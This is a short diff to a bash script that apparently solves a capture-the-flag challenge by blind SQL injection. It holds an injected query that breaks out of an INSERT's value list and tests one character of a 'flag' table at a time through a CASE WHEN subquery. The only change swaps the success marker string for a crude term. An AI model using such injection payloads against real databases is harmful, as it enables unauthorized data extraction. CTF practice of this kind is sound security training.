@@ -9,7 +9,7 @@ chars=( {a..z} {0..9} {A..Z} '{' '}' ) #characters to use to test
 
 #chars=( {0..9} '{' '}' ) #characters to use to test
 
-query="tree'),('fauna', CASE WHEN (SELECT SUBSTR(flag, 3, 1) FROM flag) = 'l' THEN 'MANILOVEFAUNA' ELSE NULL END), fauna', 'green" #sql query
+query="tree'),('fauna', CASE WHEN (SELECT SUBSTR(flag, 3, 1) FROM flag) = 'l' THEN 'milf' ELSE NULL END), fauna', 'green" #sql query
 
 pos=1 #current position 
 
